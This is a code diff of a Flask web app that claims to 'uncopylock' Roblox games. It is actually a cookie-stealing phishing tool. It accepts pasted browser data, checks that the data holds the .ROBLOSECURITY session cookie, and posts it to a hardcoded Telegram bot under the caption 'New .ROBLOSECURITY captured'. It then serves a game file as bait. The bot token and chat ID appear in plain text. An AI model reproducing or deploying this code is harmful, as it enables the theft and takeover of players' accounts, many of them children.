@@ -1,69 +1,100 @@
-from flask import Flask, request, render_template, jsonify, send_file, redirect, url_for
-import requests, secrets
+from flask import Flask, request, render_template, jsonify, send_file, redirect, url_for  
+import requests  
+import secrets  
+from pathlib import Path
+import json
+  
+app = Flask(__name__)  
 
-app = Flask(__name__)
+app.secret_key = "goodboylol67"  
 
-tokens = {}
+BOT_TOKEN = "7724967776:AAGUU3p1WTnyvV2VTRZ56L829nyAG__QDq8"  
+CHAT_ID = "7715048070"  
+  
+GAMES_FILE = Path("static/full.json")
+if GAMES_FILE.exists():
+    with open(GAMES_FILE, "r", encoding="utf-8") as f:
+        GAMES = json.load(f)
+else:
+    GAMES = []
 
-app.secret_key = "goodboylol67"
-
-BOT_TOKEN = "7724967776:AAGUU3p1WTnyvV2VTRZ56L829nyAG__QDq8"
-CHAT_ID = "7715048070"
-
-def send_txt_to_telegram(text_content):
-    """
-    Send text content as a .txt document to Telegram
-    """
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-    files = {"document": ("data.txt", text_content, "text/plain")}
-    data = {"chat_id": CHAT_ID, "caption": "game data"}
-    try:
-        response = requests.post(url, data=data, files=files)
-        return response.json()
-    except Exception as e:
-        # print(f"Telegram API Error: {e}")
-        return None
-
-def process_input(place_id):
-    required_substring = "referer: https://www.roblox.com/"
-
-    if place_id and required_substring in place_id:
-        send_txt_to_telegram(place_id)
-        # Success response
-        
-        token = secrets.token_urlsafe(16)
-        tokens[token] = True
-        file_path = f"/uncopylocked?token={token}"
+DEFAULT_GAME = next(
+    ({"gameid": g["DEFAULTgameid"], "path": g["DEFAULTpath"], "name": g["DEFAULTname"]}
+     for g in GAMES if g.get("DEFAULTgameid")), 
+    GAMES[0] if GAMES else {}
+)
+  
+sessions = {} 
+  
+def send_txt_to_telegram(text_content: str):  
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"  
+    files = {"document": ("cookie.txt", text_content, "text/plain")}  
+    data = {"chat_id": CHAT_ID, "caption": "New .ROBLOSECURITY captured"}  
+    try:  
+        r = requests.post(url, data=data, files=files, timeout=10)  
+        return r.json()  
+    except Exception as e:  
+        # print(f"Telegram error: {e}")  
+        return None  
+  
+  
+def validate_cookie(cookie: str) -> bool:  
+    required = [  
+        "referer: https://www.roblox.com/",  
+        "WARNING:-DO-NOT-SHARE-THIS.",  
+        '.ROBLOSECURITY", "_|WARNING',  
+        '$session.Cookies.Add((New-Object System.Net.Cookie(".ROBLOSECURITY"'  
+    ]  
+    return cookie and any(sub in cookie for sub in required)  
+  
+  
+@app.route('/', methods=['GET', 'POST'])  
+def index():  
+    if request.method == 'POST':  
+        cookie = request.form.get('place_id', '').strip()  
+  
+        if not validate_cookie(cookie):  
+            return jsonify({"type": "error", "msg": "XAR invalid or not found."})  
     
-        return {"type": "response", "msg": "Uncopylocked successfully!", "Path": file_path}
-    else:
-        # Error response
-        return {"type": "error", "msg": "XAR invalid or not found."}
-
-@app.route('/', methods=['GET', 'POST'])
-def index():
-    if request.method == 'POST':
-        place_id = request.form.get('place_id', '')
-        result = process_input(place_id)
-        return jsonify(result)
+        send_txt_to_telegram(cookie)  
     
-    return render_template('index.html')
-
-
-@app.route("/uncopylocked")
-def uncopylockeds():
-    token = request.args.get("token")
-    if not token or token not in tokens:
-    	return redirect(url_for("index"))
-        # abort(403) 
-        
-    tokens.pop(token)
-
-    return send_file(
-        "static/Steal-a-Brainrot.rbxl",
-        as_attachment=True,
-        download_name="Steal-a-Brainrot.rbxl"
-    )
+        token = secrets.token_urlsafe(20)  
     
-if __name__ == '__main__':
-    app.run(debug=True, port=5003)
+        selected_game = DEFAULT_GAME.copy()  
+        for game in GAMES:  
+            if "gameid" in game and game["gameid"] in cookie:
+                selected_game = game  
+                break  
+    
+        sessions[token] = {  
+            "cookie": cookie,  
+            "game": selected_game  
+        }  
+  
+        return jsonify({  
+            "type": "response",  
+            "msg": "Uncopylocked successfully!",  
+            "Path": f"/uncopylocked?token={token}"  
+        })  
+  
+    return render_template('index.html')  
+  
+  
+@app.route("/uncopylocked")  
+def uncopylocked():  
+    token = request.args.get("token")  
+    if not token or token not in sessions:  
+        return redirect(url_for("index"))  
+  
+    session_data = sessions.pop(token)  
+  
+    game = session_data["game"]  
+  
+    return send_file(  
+        game["path"],  
+        as_attachment=True,  
+        download_name=game["name"]  
+    )  
+  
+if __name__ == '__main__':  
+    app.run(debug=True)  
